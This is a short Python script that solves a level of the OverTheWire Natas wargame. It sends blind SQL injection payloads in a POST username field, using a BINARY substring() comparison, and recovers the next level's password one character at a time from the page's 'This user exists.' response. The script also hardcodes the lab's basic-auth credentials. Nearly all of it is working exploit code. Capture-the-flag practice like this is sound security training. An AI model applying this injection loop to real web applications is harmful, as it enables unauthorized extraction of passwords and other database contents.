import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u="http://natas15.natas.labs.overthewire.org/index.php?debug"

password="" # start with blank password
count = 1   # substr() length argument starts at 1
PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
VALID_CHARS = string.digits + string.ascii_letters

while count <= PASSWORD_LENGTH + 1:
    for c in VALID_CHARS:
        payload="username=natas16" + \
                "\" AND " + \
                "BINARY substring(password,1," + str(count) + ")" + \
                " = '" + password + c + "'" + \
                " -- "

        # print(payload)

        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False)

        if 'This user exists.' in response.text:
            print("Found one more char : %s" % (password+c))
            password += c
            count = count + 1

print("Done!")
